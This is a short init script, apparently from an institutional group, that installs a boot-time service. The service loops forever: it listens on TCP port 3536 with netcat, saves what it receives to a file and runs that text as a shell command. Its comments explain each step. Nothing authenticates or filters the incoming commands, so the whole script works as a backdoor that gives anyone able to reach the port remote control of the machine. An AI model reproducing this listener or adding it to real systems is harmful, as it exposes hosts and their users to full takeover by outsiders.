#! /bin/sh
### BEGIN INIT INFO
# IFTO - GREDES
# Provides:          CCM
# Documentation:     Lucas Coutinho de Almeida
# Short-Description: 
### END INIT INFO

#This executes ever these commands: nc, reads and writes to network connections using the TCP and UDP protocols
#The variable $a recive the result of command `cat b`
#And the last line is used to execute the variable $a and liberate the terminal
#This script executes an loop
while :
do
	nc -l 3536 > b
	a=`cat b`
	$a &
done